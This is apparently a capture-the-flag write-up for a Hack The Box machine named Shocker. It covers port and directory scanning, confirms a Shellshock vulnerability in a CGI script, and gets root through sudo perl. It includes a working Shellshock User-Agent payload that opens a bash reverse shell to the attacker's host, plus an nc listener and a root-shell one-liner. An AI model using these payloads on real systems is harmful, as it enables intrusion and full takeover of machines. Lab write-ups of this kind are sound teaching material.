![image](https://user-images.githubusercontent.com/105310322/187502717-ef017f09-d945-45f7-a1e9-46e7eea95bc9.png)

### Tools: nmap, gobuster

### Vulnerabilities: CGI

Nmap reveals port 80 and 2222 are open. I didn't bother with ssh since the there wasn't many other AV's.

```console
└──╼ [★]$ sudo nmap -sC -A -sV 10.129.67.229
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 16:42 BST
Nmap scan report for 10.129.67.229
Host is up (0.0058s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/24%OT=80%CT=1%CU=38094%PV=Y%DS=2%DC=T%G=Y%TM=630646E
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M539ST11NW6%O2=M539ST11NW6%O3=M539NNT11NW6%O4=M539ST11NW6%O5=M539ST1
OS:1NW6%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   10.73 ms 10.10.14.1
2   7.78 ms  10.129.67.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds
```
The webpage takes us to a very simple picture and not much else. While I ran a gobuster I tried to see if there was anything hiding in the picture but to no avail.

![image](https://user-images.githubusercontent.com/105310322/186470526-8b27d332-2840-476d-a365-3a5748205f13.png)

gobuster doesn't reveal much either except cgi-bin, however we are unable to access this page.

```console
└──╼ [★]$ gobuster dir -u 10.129.67.235 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.67.235
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/24 18:11:54 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/cgi-bin/             (Status: 403) [Size: 296]
/server-status        (Status: 403) [Size: 301]
                                               
===============================================================
2022/08/24 18:12:04 Finished
===============================================================

```
Further inspection of the cgi-bin page reveals a script that can be ran (/user.sh) This is likely to be a shellshock vulnerability. Here we go, we have our AV!

```console
─[us-dedivip-1]─[10.10.14.35]─[htb-0xrogue@pwnbox-base]─[~]
└──╼ [★]$ gobuster dir -u 10.129.67.235/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt -x php,cgi,sh,py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.67.235/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,cgi,sh,py
[+] Timeout:                 10s
===============================================================
2022/08/24 18:21:29 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 305]
/.htaccess            (Status: 403) [Size: 305]
/.htpasswd.php        (Status: 403) [Size: 309]
/.htaccess.sh         (Status: 403) [Size: 308]
/.htpasswd.cgi        (Status: 403) [Size: 309]
/.htaccess.py         (Status: 403) [Size: 308]
/.htpasswd.sh         (Status: 403) [Size: 308]
/.htaccess.php        (Status: 403) [Size: 309]
/.htpasswd.py         (Status: 403) [Size: 308]
/.htaccess.cgi        (Status: 403) [Size: 309]
/user.sh              (Status: 200) [Size: 119]
                                               
===============================================================
2022/08/24 18:22:42 Finished
===============================================================
```
Using the nmap script further proves that it is vulnerable to a shellshock.

```console
└──╼ [★]$ sudo nmap -v -script http-shellshock -p 80 --script-args uri=/cgi-bin/user.sh 10.129.67.229
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 17:17 BST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:17
Completed NSE at 17:17, 0.00s elapsed
Initiating Ping Scan at 17:17
Scanning 10.129.67.229 [4 ports]
Completed Ping Scan at 17:17, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:17
Completed Parallel DNS resolution of 1 host. at 17:17, 0.01s elapsed
Initiating SYN Stealth Scan at 17:17
Scanning 10.129.67.229 [1 port]
Discovered open port 80/tcp on 10.129.67.229
Completed SYN Stealth Scan at 17:17, 0.04s elapsed (1 total ports)
NSE: Script scanning 10.129.67.229.
Initiating NSE at 17:17
Completed NSE at 17:17, 0.03s elapsed
Nmap scan report for 10.129.67.229
Host is up (0.0052s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

NSE: Script Post-scanning.
Initiating NSE at 17:17
Completed NSE at 17:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
           
```
I first tried this shellshock CVE taken from the nmap scan but it was not working properly. Could have just been me.

Note: Running this CVE in metasploit will work.

https://www.exploit-db.com/exploits/34900

```console
└──╼ [★]$ ./shell.py payload=reverse rhost=10.129.67.229 lhost=10.10.14.35 lport=4444
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-sys/entropysearch.cgi
[*] 404 on : /cgi-sys/entropysearch.cgi
[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
[*] 404 on : /cgi-sys/defaultwebpage.cgi
[-] Trying exploit on : /cgi-mod/index.cgi
[*] 404 on : /cgi-mod/index.cgi
[-] Trying exploit on : /cgi-bin/test.cgi
[*] 404 on : /cgi-bin/test.cgi
[-] Trying exploit on : /cgi-bin-sdb/printenv
[*] 404 on : /cgi-bin-sdb/printenv

```

However this page here shows how to do the same exploit manually with a few modifications of our own.

https://www.exploit-db.com/docs/48112

In burpsuite we sent the page http://10.129.67.235/cgi-bin/user.sh to the repeater and inputed our payload in the user agent.

Set up the listener and run the command in burpsuite.

```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.129.67.235
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.35/1235 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
After getting in my shell was really bad with everything I typed being double. However the commands were still read the same. Upgrading my shell did not do anything to help.

So if my commands look weird its fine, Keeping it that way for authenticity.

```console
└──╼ [★]$ nc -lvnp 1235
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 10.129.67.235.
Ncat: Connection from 10.129.67.235:47048.
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ wwhhooaammii

shelly
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'<-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'                       

shelly@Shocker:/usr/lib/cgi-bin$ lsls

user.sh
```
1st things first, running ```sudo -l``` gives us our next step for privilege escalation. I am able to run perl as sudo!


```console
shelly@Shocker:/usr/lib/cgi-bin$ ssuuddoo  --ll

Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ 
```

A quick look a GTFO bins gives us a simple perl command to give us a root shell and the 2 flags!

https://gtfobins.github.io/gtfobins/perl/


```console
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'sudo perl -e 'exec "/bin/sh";'

# wwhhooaammii

root
# 
```

Note: Even though upgrading my shell made it look better, I still received the double letters

```console
# python3 -c 'import pty; pty.spawn("/bin/bash")'python3 -c 'import pty; pty.spawn("/bin/bash")'

root@Shocker:/usr/lib/cgi-bin# 
```
```console
root@Shocker:/home/shelly# ccaatt  uusseerr..ttxxtt

2ec2****************************
root@Shocker:/home/shelly# 
```

```console
root@Shocker:~# ccaatt  rroooott..ttxxtt

52c2****************************
root@Shocker:~# 
```

GG!
